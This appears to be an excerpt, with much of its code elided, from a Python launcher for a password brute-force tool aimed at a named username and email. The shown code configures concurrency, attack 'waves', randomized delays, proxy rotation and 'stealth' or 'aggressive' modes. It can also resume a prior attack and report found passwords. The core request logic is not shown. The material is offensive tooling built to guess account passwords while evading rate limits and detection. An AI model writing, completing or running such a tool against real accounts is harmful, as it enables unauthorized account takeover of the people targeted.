...
async def interactive_launcher():
    ...
    for key, config in configs.items():
        ...
        print(
            f"      Concurrent: {config['max_concurrent']} | Waves: {config['waves']} | Delay: {config['delay_range'][0]}-{config['delay_range'][1]}s")
...
async def custom_launcher():
    ...
    try:
        max_concurrent = int(
            input(f"🧵 Max concurrent (1-200, default=30): ") or "30")
        waves = int(input(f"🌊 Number of waves (1-100, default=20): ") or "20")
        min_delay = float(
            input(f"⏱️ Min delay (0.1-10, default=2.0): ") or "2.0")
        max_delay = float(
            input(f"⏱️ Max delay (0.5-30, default=5.0): ") or "5.0")
        ...
        max_passwords = int(input(
            f"🔑 Max passwords to test (1-{len(passwords)}, default=all): ") or str(len(passwords)))
        max_passwords = max(1, min(len(passwords), max_passwords))

        # Proxy usage
        use_proxies = input(
            f"🌐 Use {len(proxies)} proxies? (Y/n): ").strip().lower() != 'n'
...
async def resume_attack():
    ...
    try:
        ...
        if 0 <= choice < len(result_files[:5]):
            ...
            print(
                f"   Attempts: {previous_results['statistics']['total_attempts']}")
            print(
                f"   Success: {previous_results['statistics']['success_count']}")
            print(
                f"   Found: {len(previous_results['found_passwords'])} passwords")
...
def main():
    ...
    if len(sys.argv) > 1:
        ...
        if sys.argv[1] == '--target':
            if len(sys.argv) > 2:
                username = sys.argv[2]
                email = sys.argv[3] if len(
                    sys.argv) > 3 else "unknown@example.com"
                asyncio.run(quick_attack_specific_target(username, email))
            else:
                print(
                    "❌ Usage: python launcher.py --target <username> [email]")
            ...
            print(
                "❌ Unknown argument. Use --target, --stealth, --balanced, --aggressive, or --resume")
    else:
        # Interactive mode
        try:
